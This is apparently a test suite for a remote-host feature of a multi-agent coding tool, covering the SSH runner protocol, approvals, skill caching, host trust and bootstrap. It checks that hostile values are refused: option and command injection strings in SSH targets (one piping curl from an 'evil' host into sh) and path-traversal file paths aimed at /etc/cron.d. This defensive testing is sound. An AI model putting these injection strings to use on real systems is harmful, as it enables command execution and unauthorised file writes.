/* eslint-disable @typescript-eslint/no-explicit-any */
import { test } from "node:test";
import assert from "node:assert/strict";
import { execFileSync, spawn as nodeSpawn, spawnSync } from "node:child_process";
import { EventEmitter } from "node:events";
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { PassThrough } from "node:stream";
import { RemoteAdapter } from "../src/adapters/remote";
import { AgentAdapter, TurnRequest } from "../src/adapters/types";
import { parseConfig, SAMPLE_CONFIG } from "../src/core/config";
import { RateLimitError } from "../src/core/scheduler";
import { SKILL_TEMPLATE, REMOTE_SKILLS } from "../src/core/skills";
import { HostDef } from "../src/core/types";
import { ensureWorktree } from "../src/core/worktree";
import { HostConnection, HostConnectionError, HostDeniedError, HostManager, ProcessLike, bootstrapScript, explainFailure, remoteCommand, runnerHash, sq, sshArgs, fingerprint } from "../src/remote/host";
import { LineDecoder, PREFIX, encode, NEED_RUNNER } from "../src/remote/protocol";
import { Runner } from "../src/remote/runner";
import { AgentRoomMcp } from "../src/mcp/server";
import { scripted } from "./remote-fakes";
import { Fake, idle, makeRoom } from "./helpers";

const tmp = (p = "rt-") => mkdtempSync(join(tmpdir(), p));
const hasSh = spawnSync("sh", ["-c", "exit 0"], { stdio: "ignore" }).status === 0;
const git = (cwd: string, ...a: string[]) => execFileSync("git", a, { cwd, encoding: "utf8" }).trim();
function repo() {
  const d = tmp();
  git(d, "init", "-q", "-b", "main"); git(d, "config", "user.email", "t@t"); git(d, "config", "user.name", "t");
  writeFileSync(join(d, "a.txt"), "a"); git(d, "add", "."); git(d, "commit", "-qm", "init");
  return d;
}

const cfg = parseConfig(SAMPLE_CONFIG);
const spec = (o: Partial<HostDef> = {}): HostDef => ({ name: "box", ssh: "dev@box", connectTimeoutSec: 15, repo: "/srv/app", ...o });

/** A runner living in this process, wired to the hub through two pipes instead of ssh. */
function inProcess(home: string, adapter: AgentAdapter = scripted, extra: { noise?: boolean; deaf?: boolean } = {}) {
  const runners: Runner[] = [];
  const spawn = (): ProcessLike => {
    const toRunner = new PassThrough(), fromRunner = new PassThrough(), err = new PassThrough();
    const ev = new EventEmitter();
    if (extra.noise) fromRunner.write("Welcome to the box\nmotd: patches pending\n");
    const info = { node: "22.0.0", platform: "linux", arch: "x64", hostname: "box", home, claude: "/usr/bin/claude" };
    if (extra.deaf) {
      // says ready, then never answers anything (a half-dead ssh link)
      fromRunner.write(encode({ t: "ready", v: 1, ...info }));
    } else {
      const r = new Runner(toRunner, fromRunner, { home, ensureWorktree, makeAdapter: () => adapter, info });
      runners.push(r);
      void r.run();
    }
    return {
      stdin: toRunner, stdout: fromRunner, stderr: err,
      kill: () => { toRunner.end(); fromRunner.end(); ev.emit("exit", 143); },
      on: ((e: string, cb: (...a: any[]) => void) => ev.on(e, cb)) as ProcessLike["on"],
    };
  };
  return { spawn, runners };
}

function request(over: Partial<TurnRequest> & { prompt: string }, remote: Partial<NonNullable<TurnRequest["remote"]>> = {}) {
  const worker = cfg.workers.find((w) => w.id === "be")!;
  const activity: string[] = [];
  const req: TurnRequest = {
    worker, account: cfg.accounts[0], cwd: "(remote)", systemAppend: "SYS", mcpUrl: "http://127.0.0.1:1/none", signal: new AbortController().signal,
    remote: { host: "box", base: "/srv/app", skills: [], ...remote },
    onActivity: (t) => activity.push(t), approve: async () => true, ...over,
  };
  return { req, activity };
}

// ---------------------------------------------------------------- protocol

test("protocol: lines split across chunks; noise and broken JSON are reported, not parsed", () => {
  const got: unknown[] = [], other: string[] = [];
  const d = new LineDecoder((m) => got.push(m), (l) => other.push(l));
  const wire = encode({ t: "ping", n: 1 });
  d.push("Welcome!\n" + wire.slice(0, 7));
  d.push(wire.slice(7) + PREFIX + "{broken\r\n");
  d.push(encode({ t: "ping", n: 2 }));
  assert.deepEqual(got, [{ t: "ping", n: 1 }, { t: "ping", n: 2 }]);
  assert.deepEqual(other, ["Welcome!", PREFIX + "{broken"]);
});

// ---------------------------------------------------------------- runner over a pipe

test("runner: handshake, then a turn returns session, usage, activity and where it ran", async () => {
  const base = repo();
  const { spawn } = inProcess(tmp());
  const c = new HostConnection({ spec: spec(), spawn });
  const { req, activity } = request({ prompt: "[ACT] hello" }, { base });
  const r = await c.runTurn(req);
  assert.equal(c.state, "ready");
  assert.equal(c.info!.hostname, "box");
  assert.equal(r.sessionId, "sess-be");
  assert.match(r.text, /^ok:\[ACT\] hello/);
  assert.equal(r.usage!.costUsd, 0.01);
  assert.deepEqual(activity, ["Edit a.ts", "Bash npm test"]);
  assert.equal(r.cwd, join(base, ".agentroom", "worktrees", "be"), "the runner created the worktree on its own side");
  assert.equal(git(r.cwd!, "branch", "--show-current"), "agentroom/be");
  c.close();
});

test("runner: worker settings, account, session and read-only reach the host's adapter; ~ expands on the host", async () => {
  const home = tmp("home-");
  mkdirSync(join(home, "code"));
  const { spawn } = inProcess(home);
  const c = new HostConnection({ spec: spec(), spawn });
  const be = { ...cfg.workers.find((w) => w.id === "be")!, worktree: false, model: "m-x", allowedTools: ["Read", "Edit(apps/**)"] };
  const acc = { ...cfg.accounts[0], home: "/remote/claude-home", apiKeyEnv: "REMOTE_KEY" };
  const { req } = request({ prompt: "[ECHO]", worker: be, account: acc, sessionId: "resume-me", readOnly: true }, { base: "~/code" });
  const r = JSON.parse((await c.runTurn(req)).text);
  assert.deepEqual([r.cwd, r.session, r.readOnly, r.worker], [join(home, "code"), "resume-me", true, "be"]);
  assert.deepEqual(r.tools, ["Read", "Edit(apps/**)"]);
  assert.deepEqual([r.account, r.home, r.apiKeyEnv], ["claude-main", "/remote/claude-home", "REMOTE_KEY"]);
  assert.equal(r.sys, "SYS");
  c.close();
});

test("runner: a missing repo folder is a clear error, and the host stays usable", async () => {
  const { spawn } = inProcess(tmp());
  const c = new HostConnection({ spec: spec(), spawn });
  await assert.rejects(c.runTurn(request({ prompt: "x" }, { base: "/does/not/exist" }).req), /không tồn tại trên máy này/);
  assert.equal(c.state, "ready");
  const ok = await c.runTurn(request({ prompt: "y" }, { base: tmp() }).req);
  assert.match(ok.text, /^ok:y/);
  c.close();
});

test("runner: approvals are asked on the hub and the answer goes back to the remote agent", async () => {
  const { spawn } = inProcess(tmp());
  const c = new HostConnection({ spec: spec(), spawn });
  const asked: unknown[] = [];
  const yes = await c.runTurn(request({ prompt: "[APPROVE]", approve: async (t, i) => { asked.push([t, i]); return true; } }, { base: tmp() }).req);
  const no = await c.runTurn(request({ prompt: "[APPROVE]", approve: async () => false }, { base: tmp() }).req);
  assert.deepEqual(asked, [["Bash", { command: "ls" }]]);
  assert.deepEqual([yes.text, no.text], ["approved", "denied"]);
  c.close();
});

test("runner: a refusal carries its reason to the remote agent, and the worker's autonomy reaches the runner", async () => {
  const { spawn } = inProcess(tmp());
  const c = new HostConnection({ spec: spec(), spawn });
  const r = await c.runTurn(request({ prompt: "[APPROVE]", approve: async () => ({ allow: false, reason: "Bị chặn bởi chế độ auto: sudo" }) }, { base: tmp() }).req);
  assert.equal(r.text, "denied:Bị chặn bởi chế độ auto: sudo");
  const ok = await c.runTurn(request({ prompt: "[APPROVE]", approve: async () => ({ allow: true }) }, { base: tmp() }).req);
  assert.equal(ok.text, "approved");
  const a = await c.runTurn(request({ prompt: "[AUTONOMY]", autonomy: "auto" }, { base: tmp() }).req);
  assert.equal(a.text, "autonomy:auto");
  c.close();
});

test("runner: errors keep their meaning — plain failure vs rate limit with retry-after", async () => {
  const { spawn } = inProcess(tmp());
  const c = new HostConnection({ spec: spec(), spawn });
  await assert.rejects(c.runTurn(request({ prompt: "[FAIL]" }, { base: tmp() }).req), (e: Error) => e.message === "boom" && !(e instanceof RateLimitError));
  await assert.rejects(c.runTurn(request({ prompt: "[RATE]" }, { base: tmp() }).req), (e: Error) => e instanceof RateLimitError && (e as RateLimitError).retryAfterMs === 1234);
  c.close();
});

test("runner: aborting on the hub stops the turn on the host", async () => {
  const { spawn } = inProcess(tmp());
  const c = new HostConnection({ spec: spec(), spawn });
  const ac = new AbortController();
  const p = c.runTurn(request({ prompt: "[SLEEP]", signal: ac.signal }, { base: tmp() }).req);
  setTimeout(() => ac.abort(), 50);
  await assert.rejects(p, /aborted/);
  assert.equal(c.inFlight, 0);
  c.close();
});

test("runner: several turns at once on one connection stay separate", async () => {
  const { spawn } = inProcess(tmp());
  const c = new HostConnection({ spec: spec(), spawn });
  const t0 = Date.now();
  const rs = await Promise.all(["a", "b", "c"].map((p) => c.runTurn(request({ prompt: `[SLOW] ${p}` }, { base: tmp() }).req)));
  assert.deepEqual(rs.map((r) => r.text.slice(-1)), ["a", "b", "c"].map((x) => x));
  assert.ok(Date.now() - t0 < 800, "ran concurrently, not one after another");
  c.close();
});

test("runner: stray lines from the remote shell (banners, motd) are ignored", async () => {
  const logged: string[] = [];
  const { spawn } = inProcess(tmp(), scripted, { noise: true });
  const c = new HostConnection({ spec: spec(), spawn, log: (t) => logged.push(t) });
  assert.match((await c.runTurn(request({ prompt: "hi" }, { base: tmp() }).req)).text, /^ok:hi/);
  assert.ok(logged.some((l) => /Welcome to the box/.test(l)));
  c.close();
});

test("connection: dropping mid-turn fails that turn with a connection error, and the next turn reconnects", async () => {
  const sp = inProcess(tmp());
  const c = new HostConnection({ spec: spec(), spawn: sp.spawn });
  await c.connect();
  const p = c.runTurn(request({ prompt: "[SLEEP]" }, { base: tmp() }).req);
  await new Promise((r) => setTimeout(r, 40));
  (c as unknown as { proc: ProcessLike }).proc.kill();
  await assert.rejects(p, (e: Error) => e instanceof HostConnectionError);
  const r = await c.runTurn(request({ prompt: "after" }, { base: tmp() }).req);
  assert.match(r.text, /^ok:after/);
  assert.equal(sp.runners.length, 2, "a fresh runner was started");
  c.close();
});

test("connection: a host that stops answering pings is dropped and reported", async () => {
  const { spawn } = inProcess(tmp(), scripted, { deaf: true });
  const c = new HostConnection({ spec: spec(), spawn, pingMs: 15, deadMs: 60 });
  await c.connect();
  const p = c.runTurn(request({ prompt: "x" }, { base: tmp() }).req);
  await assert.rejects(p, /không phản hồi/);
  assert.equal(c.state, "error");
});

test("connection: spawn failures and startup timeouts surface as readable errors", async () => {
  const c1 = new HostConnection({ spec: spec(), spawn: () => { throw new Error("không có ssh"); } });
  await assert.rejects(c1.connect(), /không có ssh/);
  assert.equal(c1.state, "error");
  const silent = (): ProcessLike => ({ stdin: new PassThrough(), stdout: new PassThrough(), stderr: new PassThrough(), kill: () => undefined, on: (() => undefined) as ProcessLike["on"] });
  const c2 = new HostConnection({ spec: spec(), spawn: silent, readyTimeoutMs: 40 });
  await assert.rejects(c2.connect(), /Hết thời gian chờ runner/);
});

// ---------------------------------------------------------------- skills on the host

test("skills: copied to the host once per content; Claude gets a plugin there, Codex gets paths on the host", async () => {
  const home = tmp("home-");
  const local = tmp("skills-");
  mkdirSync(join(local, "zorb", "scripts"), { recursive: true });
  writeFileSync(join(local, "zorb", "SKILL.md"), SKILL_TEMPLATE("zorb", "Dùng khi X"));
  writeFileSync(join(local, "zorb", "scripts", "run.sh"), "echo hi");
  const { spawn } = inProcess(home);
  const c = new HostConnection({ spec: spec(), spawn });
  const be = { ...cfg.workers.find((w) => w.id === "be")!, worktree: false, useSkills: ["zorb"] };
  const skills = [{ name: "zorb", dir: join(local, "zorb") }];

  const claude = JSON.parse((await c.runTurn(request({ prompt: "[ECHO]", worker: be }, { base: tmp(), skills }).req)).text);
  assert.deepEqual(claude.claudeSkills.skills, ["agentroom:zorb"]);
  const plugin = claude.claudeSkills.plugins[0].path as string;
  assert.ok(plugin.startsWith(join(home, ".agentroom", "skills-cache")));
  assert.ok(existsSync(join(plugin, "skills", "zorb", "SKILL.md")));
  assert.ok(existsSync(join(plugin, "skills", "zorb", "scripts", "run.sh")));
  assert.equal(readdirSync(join(home, ".agentroom", "skills-cache")).length, 1);

  const again = JSON.parse((await c.runTurn(request({ prompt: "[ECHO]", worker: be }, { base: tmp(), skills }).req)).text);
  assert.equal(again.claudeSkills.plugins[0].path, plugin, "same content → same cache entry");

  const codexWorker = { ...be, provider: "codex" as const };
  const codexAcc = { ...cfg.accounts[1] };
  const cx = JSON.parse((await c.runTurn(request({ prompt: "[ECHO]", worker: codexWorker, account: codexAcc, systemAppend: `file: ${REMOTE_SKILLS}/zorb/SKILL.md` }, { base: tmp(), skills }).req)).text);
  const srcDir = join(plugin, "..", "src");
  assert.equal(cx.sys, `file: ${join(srcDir)}/zorb/SKILL.md`.replace(/\/+/g, "/"));
  assert.deepEqual(cx.extra, [srcDir.replace(/\/+/g, "/")]);
  assert.equal(cx.claudeSkills, undefined);
  c.close();
});

test("skills: a hostile skill pack cannot write outside the cache; oversized skills are refused on the hub", async () => {
  const home = tmp("home-");
  const r = new Runner(new PassThrough(), new PassThrough(), { home, ensureWorktree, makeAdapter: () => scripted, info: { node: "22", platform: "linux", arch: "x64", hostname: "h", home } });
  const f = (path: string) => ({ name: "evil", files: [{ path, b64: Buffer.from("x").toString("base64") }] });
  for (const bad of ["../../escape.txt", "/etc/cron.d/x", "a/../../b"]) assert.throws(() => r.materializeSkills([f(bad)]), /không an toàn/, bad);
  assert.throws(() => r.materializeSkills([{ name: "../bad", files: [] }]), /không hợp lệ/);
  assert.equal(existsSync(join(home, "escape.txt")), false);

  const big = tmp("big-");
  mkdirSync(join(big, "s"));
  writeFileSync(join(big, "s", "blob.bin"), Buffer.alloc(5 * 1024 * 1024 + 10));
  const c = new HostConnection({ spec: spec(), spawn: inProcess(home).spawn });
  await assert.rejects(c.runTurn(request({ prompt: "x" }, { base: tmp(), skills: [{ name: "s", dir: join(big, "s") }] }).req), /quá lớn/);
});

// ---------------------------------------------------------------- MCP relay + the whole room

test("relay: a remote agent uses the room's tools through the channel, and unknown paths are 404", async () => {
  const holder: { mcp?: AgentRoomMcp } = {};
  const { room } = makeRoom(new Fake(() => ""), { mcpUrl: (id) => holder.mcp!.urlFor(id) });
  holder.mcp = new AgentRoomMcp(room);
  await holder.mcp.start();
  const c = new HostConnection({ spec: spec(), spawn: inProcess(tmp()).spawn });
  try {
    const { req } = request({ prompt: "[MCP]", mcpUrl: holder.mcp.urlFor("be") }, { base: tmp() });
    const out = JSON.parse((await c.runTurn(req)).text);
    assert.ok(out.tools >= 11 && out.created);
    const msgs = room.snapshot().messages;
    assert.ok(msgs.some((m) => m.from === "be" && /từ máy xa/.test(m.text)), "post_message arrived in the hub's room");
    assert.ok(room.tasks.list().some((t) => t.title === "task từ máy xa" && t.assignee === "be" && t.createdBy === "be"), "identity is the turn's worker");
    const bad = await c.runTurn(request({ prompt: "[BADMCP]", mcpUrl: holder.mcp.urlFor("be") }, { base: tmp() }).req);
    assert.equal(bad.text, "404");
  } finally { c.close(); holder.mcp.dispose(); }
});

const remoteCfg = () => parseConfig(`
hosts:
  box: { ssh: "dev@box", repo: /srv/app }
accounts:
  local-c: { provider: claude, maxConcurrent: 2 }
  box-c: { provider: claude, host: box, maxConcurrent: 2 }
workers:
  - { id: lead, name: L, role: Lead, account: local-c, coordinator: true }
  - { id: qa, name: Q, role: QA, account: local-c }
  - { id: be, name: B, role: Backend, account: box-c, worktree: true }
`);

test("room: local and remote workers run side by side; sessions, usage and inspector know which machine", async () => {
  const base = repo();
  const holder: { mcp?: AgentRoomMcp } = {};
  const config = remoteCfg();
  config.hosts[0].repo = base;
  const sp = inProcess(tmp());
  const manager = new HostManager(config.hosts, { spawnerFor: () => ({ spawn: sp.spawn }) });
  const localCalls: string[] = [];
  const local = new Fake(async (req) => { localCalls.push(req.worker.id); await new Promise((r) => setTimeout(r, 200)); return `local ${req.worker.id}`; });
  const { room, deps, root } = makeRoom(local, { config, remote: new RemoteAdapter(manager), mcpUrl: (id) => holder.mcp!.urlFor(id) });
  holder.mcp = new AgentRoomMcp(room);
  await holder.mcp.start();
  try {
    const t0 = Date.now();
    room.post("user", "@qa [SLOW] kiểm tra", { taskId: "L1" });
    room.post("user", "@be [SLOW] [ECHO] làm API", { taskId: "R1" });
    await idle(room);
    assert.ok(Date.now() - t0 < 900, "the remote turn did not wait for the local one");
    const echo = JSON.parse(room.snapshot().messages.find((m) => m.from === "be")!.text);
    assert.equal(echo.cwd, join(base, ".agentroom", "worktrees", "be"));
    assert.match(echo.sys, /máy từ xa "box"/);
    assert.match(echo.sys, /git push origin agentroom\/be/);
    assert.ok(!/(^|[^\w＠])@lead\b/.test(echo.sys));
    assert.deepEqual(localCalls, ["qa"]);

    const sessions = JSON.parse(readFileSync(join(root, "state", "sessions.json"), "utf8"));
    assert.ok(sessions["be:R1@box"], "remote sessions carry the host");
    assert.ok(sessions["qa:L1"] === undefined || !sessions["qa:L1@box"]);
    const u = deps.usage.all().find((x) => x.worker === "be")!;
    assert.equal(u.account, "box-c");
    const reply = room.snapshot().messages.find((m) => m.from === "be")!;
    const rec = deps.inspector.load(reply.turnId!)!;
    assert.equal(rec.cwd, `box:${join(base, ".agentroom", "worktrees", "be")}`);
    assert.equal(rec.sessionKey, "be:R1@box");
    assert.equal(room.snapshot().workers.find((w) => w.id === "be")!.host, "box");
    assert.equal(room.snapshot().workers.find((w) => w.id === "qa")!.host, undefined);

    // the second turn of the same thread resumes the host's session
    room.post("user", "@be [ECHO] tiếp", { taskId: "R1" });
    await idle(room);
    const second = JSON.parse(room.snapshot().messages.filter((m) => m.from === "be").at(-1)!.text);
    assert.equal(second.session, "sess-be");
  } finally { manager.closeAll(); holder.mcp.dispose(); }
});

test("room: an unreachable host is reported once, does not loop, and recovers when it comes back", async () => {
  const config = remoteCfg();
  config.hosts[0].repo = repo();
  let up = false;
  const sp = inProcess(tmp());
  const manager = new HostManager(config.hosts, { spawnerFor: () => ({ spawn: () => { if (!up) throw new Error("ssh: connect to host box port 22: Connection refused"); return sp.spawn(); } }) });
  const { room } = makeRoom(new Fake(() => "ok"), { config, remote: new RemoteAdapter(manager) });
  try {
    room.post("user", "@be làm đi");
    await idle(room);
    await new Promise((r) => setTimeout(r, 80));
    const errors = room.snapshot().messages.filter((m) => m.from === "system" && /gặp lỗi/.test(m.text));
    assert.equal(errors.length, 1);
    assert.match(errors[0].text, /Connection refused/);
    assert.deepEqual(errors[0].to, [], "the error message must not wake the failing worker");
    up = true;
    room.post("user", "@be thử lại [ECHO]");
    await idle(room);
    assert.ok(room.snapshot().messages.some((m) => m.from === "be"));
  } finally { manager.closeAll(); }
});

test("room: a worker on a host needs a repo path; sessions of local workers keep their old keys", () => {
  const base = "accounts: { l: { provider: claude }, r: { provider: claude, host: h } }\nworkers:\n";
  assert.throws(() => parseConfig("hosts: { h: { ssh: u@h } }\n" + base + "  - { id: be, name: B, role: R, account: r }"), /cần workdir/);
  assert.throws(() => parseConfig("hosts: { h: { ssh: u@h, repo: relative/path } }\n" + base + "  - { id: be, name: B, role: R, account: r }"), /tuyệt đối/);
  const ok = parseConfig("hosts: { h: { ssh: u@h } }\n" + base + "  - { id: be, name: B, role: R, account: r, workdir: ~/app }\n  - { id: fe, name: F, role: R, account: l, workdir: ../clone }");
  assert.equal(ok.workers.find((w) => w.id === "be")!.workdir, "~/app");
  assert.throws(() => parseConfig("accounts: { r: { provider: claude, host: nope } }\nworkers: [{ id: be, name: B, role: R, account: r }]"), /không có host "nope"/);
  assert.throws(() => parseConfig("hosts: { local: { ssh: u@h } }\naccounts: { l: { provider: claude } }\nworkers: [{ id: be, name: B, role: R, account: l }]"), /dành riêng/);
});

// ---------------------------------------------------------------- host manager and trust

test("manager: the user is asked once per host definition; a change asks again; declining blocks the turn", async () => {
  const asked: string[] = [];
  let answer = true;
  const sp = inProcess(tmp());
  const hosts = [spec()];
  const m = new HostManager(hosts, { spawnerFor: () => ({ spawn: sp.spawn }), confirm: async (s) => { asked.push(s.ssh); return answer; } });
  await m.runTurn(request({ prompt: "1" }, { base: tmp() }).req);
  await m.runTurn(request({ prompt: "2" }, { base: tmp() }).req);
  assert.deepEqual(asked, ["dev@box"]);
  m.closeAll();

  answer = false;
  const changed = new HostManager([spec({ ssh: "evil@elsewhere" })], { spawnerFor: () => ({ spawn: sp.spawn }), confirm: async (s) => { asked.push(s.ssh); return answer; } });
  await assert.rejects(changed.runTurn(request({ prompt: "3" }, { base: tmp() }).req), HostDeniedError);
  assert.deepEqual(asked, ["dev@box", "evil@elsewhere"]);
  assert.notEqual(fingerprint(spec()), fingerprint(spec({ node: "/x/node" })));
  const ghost = request({ prompt: "4" }).req;
  await assert.rejects(m.runTurn({ ...ghost, remote: { host: "ghost", base: "/x", skills: [] } }), /Không có host "ghost"/);
});

test("manager: check() connects to every host and reports state, node, CLI paths and errors", async () => {
  const sp = inProcess(tmp());
  const m = new HostManager([spec(), spec({ name: "down", ssh: "dev@down" })], {
    spawnerFor: (s) => ({ spawn: s.name === "down" ? () => { throw new Error("Connection timed out"); } : sp.spawn }),
  });
  const st = await m.check();
  const up = st.find((s) => s.name === "box")!, down = st.find((s) => s.name === "down")!;
  assert.deepEqual([up.state, up.node, up.claude, up.hostname, up.platform], ["ready", "22.0.0", "/usr/bin/claude", "box", "linux/x64"]);
  assert.deepEqual([down.state, down.error], ["error", "Connection timed out"]);
  assert.equal((await m.check("box")).length, 2);
  m.closeAll();
  assert.equal(m.statuses().find((s) => s.name === "box")!.state, "idle");
});

// ---------------------------------------------------------------- the ssh command line

test("ssh: target is validated so a repo's config cannot inject ssh options", () => {
  const ok = sshArgs(spec({ port: 2222, identityFile: "/k/id" }), "CMD");
  assert.deepEqual(ok, ["-o", "BatchMode=yes", "-o", "ConnectTimeout=15", "-o", "ServerAliveInterval=15", "-o", "ServerAliveCountMax=3", "-T", "-p", "2222", "-i", "/k/id", "-o", "IdentitiesOnly=yes", "--", "dev@box", "CMD"]);
  for (const bad of ["-oProxyCommand=curl evil|sh", "a b", "host;rm -rf", "$(id)", "-J jump", "", "x\ny"]) {
    assert.throws(() => sshArgs(spec({ ssh: bad }), "C"), /không hợp lệ/, JSON.stringify(bad));
  }
  assert.throws(() => sshArgs(spec({ identityFile: "-oFoo=bar" }), "C"), /không hợp lệ/);
  for (const good of ["devbox", "u@host.example.com", "u@10.0.0.5", "u@fe80::1", "prod-1"]) assert.doesNotThrow(() => sshArgs(spec({ ssh: good }), "C"), good);
  assert.throws(() => parseConfig("hosts: { h: { ssh: '-oProxyCommand=x' } }\naccounts: { a: { provider: claude } }\nworkers: [{ id: be, name: B, role: R, account: a }]"), /ssh:/);
});

test("ssh: failures are explained in terms the user can act on", () => {
  const s = spec();
  assert.match(explainFailure(s, "dev@box: Permission denied (publickey).", 255, false), /khoá SSH/);
  assert.match(explainFailure(s, "Host key verification failed.", 255, false), /ssh dev@box/);
  assert.match(explainFailure(s, "ssh: Could not resolve hostname box", 255, false), /phân giải/);
  assert.match(explainFailure(s, "ssh: connect to host box port 22: Connection timed out", 255, false), /Không kết nối được/);
  assert.match(explainFailure(s, "bash: node: command not found", 127, false), /hosts\.box\.node/);
  assert.match(explainFailure(s, "", 42, true), /quá cũ/);
  assert.match(explainFailure(s, "weird", 9, false), /mã 9\): weird/);
});

test("ssh: quoting survives awkward paths", { skip: !hasSh }, () => {
  assert.equal(sq("it's"), `'it'\\''s'`);
  const out = execFileSync("sh", ["-c", `printf %s ${sq("a b'c$HOME\"d")}`], { encoding: "utf8" });
  assert.equal(out, `a b'c$HOME"d`);
  assert.equal(runnerHash(Buffer.from("x")).length, 16);
  assert.match(bootstrapScript({}, "abc123", 99), /head -c 99 > "\$f\.part"/);
});

// ---- the real bootstrap script, run exactly as sshd would run it (`$SHELL -c <string>`), minus the network ----

const runnerFile = () => readFileSync(join(__dirname, "fake-runner.mjs"));
const shellSpawner = (home: string, specOver: Partial<HostDef> = {}, runner = runnerFile()) => {
  const s = spec({ node: process.execPath, ...specOver });
  return { s, runner, spawn: (): ProcessLike => nodeSpawn("sh", ["-c", remoteCommand(bootstrapScript(s, runnerHash(runner), runner.length))], { env: { ...process.env, HOME: home, AR_TEST_HOME: home }, stdio: ["pipe", "pipe", "pipe"] }) as unknown as ProcessLike };
};

test("bootstrap: first connect installs the runner on the host, later connects reuse it, and it works end to end", { skip: !hasSh }, async () => {
  const home = tmp("home-");
  const base = repo();
  let uploads = 0;
  const t = shellSpawner(home);
  const c1 = new HostConnection({ spec: t.s, spawn: t.spawn, runner: t.runner, onRunnerUpload: () => uploads++ });
  const r = await c1.runTurn(request({ prompt: "hello" }, { base }).req);
  assert.match(r.text, /^ok:hello/);
  assert.equal(uploads, 1);
  const installed = join(home, ".agentroom", "runner", `${runnerHash(t.runner)}.mjs`);
  assert.ok(readFileSync(installed).equals(t.runner), "the host holds exactly the bytes we sent");
  c1.close();
  const c2 = new HostConnection({ spec: t.s, spawn: t.spawn, runner: t.runner, onRunnerUpload: () => uploads++ });
  assert.match((await c2.runTurn(request({ prompt: "again" }, { base }).req)).text, /^ok:again/);
  assert.equal(uploads, 1, "no second upload");
  c2.close();
});

test("bootstrap: a login banner on the host does not disturb the protocol", { skip: !hasSh }, async () => {
  const home = tmp("home-");
  writeFileSync(join(home, ".profile"), 'echo "Welcome to box — last login yesterday"\n');
  const t = shellSpawner(home);
  const logged: string[] = [];
  const c = new HostConnection({ spec: t.s, spawn: t.spawn, runner: t.runner, log: (l) => logged.push(l) });
  assert.match((await c.runTurn(request({ prompt: "hi" }, { base: tmp() }).req)).text, /^ok:hi/);
  c.close();
});

test("bootstrap: old Node and missing Node give specific advice, with the exit code from the host", { skip: !hasSh }, async () => {
  const home = tmp("home-");
  const oldNode = join(home, "node-old");
  writeFileSync(oldNode, "#!/bin/sh\nexit 42\n"); chmodSync(oldNode, 0o755);
  const a = shellSpawner(home, { node: oldNode });
  await assert.rejects(new HostConnection({ spec: a.s, spawn: a.spawn, runner: a.runner }).connect(), /quá cũ/);
  const b = shellSpawner(home, { node: "/nonexistent/node" });
  await assert.rejects(new HostConnection({ spec: b.s, spawn: b.spawn, runner: b.runner }).connect(), /Không tìm thấy node/);
});

test("bootstrap: a node path with spaces and quotes still works", { skip: !hasSh }, async () => {
  const home = tmp("home-");
  const dir = join(home, "my tools 'x'");
  mkdirSync(dir);
  const node = join(dir, "node");
  writeFileSync(node, `#!/bin/sh\nexec ${sq(process.execPath)} "$@"\n`); chmodSync(node, 0o755);
  const t = shellSpawner(home, { node });
  const c = new HostConnection({ spec: t.s, spawn: t.spawn, runner: t.runner });
  assert.match((await c.runTurn(request({ prompt: "q" }, { base: tmp() }).req)).text, /^ok:q/);
  c.close();
});

test("room: when the connection to a host dies while an approval is pending, the card is withdrawn and the turn fails once", async () => {
  const config = remoteCfg();
  config.hosts[0].repo = repo();
  const sp = inProcess(tmp());
  const manager = new HostManager(config.hosts, { spawnerFor: () => ({ spawn: sp.spawn }) });
  const { room } = makeRoom(new Fake(() => "ok"), { config, remote: new RemoteAdapter(manager) });
  const events: string[] = [];
  room.on("approval", (a) => events.push("asked:" + a.tool));
  room.on("approvalResolved", () => events.push("withdrawn"));
  try {
    room.post("user", "@be [APPROVE] xin quyền");
    await until2(() => events.length === 1);
    assert.deepEqual(events, ["asked:Bash"]);
    assert.equal(room.snapshot().approvals.length, 1);
    (manager as unknown as { conns: Map<string, { proc: ProcessLike }> }).conns.get("box")!.proc.kill();
    await idle(room);
    assert.deepEqual(events, ["asked:Bash", "withdrawn"]);
    assert.equal(room.snapshot().approvals.length, 0);
    const errs = room.snapshot().messages.filter((m) => m.from === "system" && /Mất kết nối/.test(m.text));
    assert.equal(errs.length, 1);
    assert.deepEqual(errs[0].to, []);
  } finally { manager.closeAll(); }
});

test("remote: the runner reports the real folder, so approvals are judged against it (not against a name pattern)", async () => {
  const base = repo();
  const sp = inProcess(tmp());
  const c = new HostConnection({ spec: spec(), spawn: sp.spawn });
  const seen: string[] = [];
  const { req } = request({ prompt: "[ACT]", onCwd: (d) => seen.push(d) }, { base });
  await c.runTurn(req);
  assert.deepEqual(seen, [join(base, ".agentroom", "worktrees", "be")]);
  c.close();

  const config = remoteCfg();
  config.hosts[0].repo = base;
  const manager = new HostManager(config.hosts, { spawnerFor: () => ({ spawn: inProcess(tmp()).spawn }) });
  const { room } = makeRoom(new Fake(() => "ok"), { config, remote: new RemoteAdapter(manager) });
  try {
    room.post("user", "@be [APPROVE] xin quyền");
    await until2(() => room.snapshot().approvals.length === 1);
    const a = room.snapshot().approvals[0];
    assert.equal(a.host, "box");
    assert.equal(a.cwd, join(base, ".agentroom", "worktrees", "be"), "the approval carries the real worktree path");
    room.respondApproval(a.id, false);
    await idle(room);
  } finally { manager.closeAll(); }
});

const until2 = async (pred: () => boolean, ms = 3000) => { const t = Date.now(); while (!pred()) { if (Date.now() - t > ms) throw new Error("timeout"); await new Promise((r) => setTimeout(r, 10)); } };
